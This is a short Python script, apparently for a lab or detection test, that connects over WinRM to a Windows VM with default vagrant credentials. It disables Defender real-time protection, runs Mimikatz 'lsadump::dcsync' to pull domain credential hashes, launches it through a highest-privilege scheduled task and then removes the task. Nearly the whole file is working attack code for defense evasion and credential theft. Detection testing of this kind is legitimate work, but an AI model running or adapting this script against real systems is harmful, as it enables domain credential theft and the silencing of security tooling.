"""Run Mimikatz DCSync via WinRM on win10 VM."""
import winrm, datetime, time

HOST = '192.168.50.17'
USER = 'vagrant'
PASS = 'vagrant'

s = winrm.Session(HOST, auth=(USER, PASS), transport='ntlm')

# Disable Defender
r = s.run_ps('Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue; Write-Host "Defender: disabled"')
print(r.std_out.decode())

# Create batch file
bat = r'C:\Users\vagrant\Desktop\mimikatz\x64\mimikatz.exe "lsadump::dcsync /domain:windomain2025.local /user:vagrant" exit > C:\Users\vagrant\Desktop\mimi_out.txt 2>&1'
script = f'Set-Content -Path C:\\Users\\vagrant\\Desktop\\run_mimi.bat -Value "{bat}" -Encoding ASCII; Write-Host "Batch created"'
r = s.run_ps(script)
print(r.std_out.decode())

# Run via scheduled task
ts = datetime.datetime.now(datetime.UTC)
print(f"TIMESTAMP: {ts.strftime('%Y-%m-%dT%H:%M:%S')}Z")

task_cmd = r'''
$action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c C:\Users\vagrant\Desktop\run_mimi.bat"
$trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(5)
$principal = New-ScheduledTaskPrincipal -UserId "win10\vagrant" -LogonType Interactive -RunLevel Highest
Register-ScheduledTask -TaskName "MimiTest" -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null
Start-ScheduledTask -TaskName "MimiTest"
Start-Sleep 15
if (Test-Path C:\Users\vagrant\Desktop\mimi_out.txt) {
    Get-Content C:\Users\vagrant\Desktop\mimi_out.txt
} else {
    Write-Host "NO OUTPUT FILE"
}
Unregister-ScheduledTask -TaskName "MimiTest" -Confirm:$false 2>$null
'''
r = s.run_ps(task_cmd)
print(r.std_out.decode())
if r.std_err:
    print("STDERR:", r.std_err.decode())
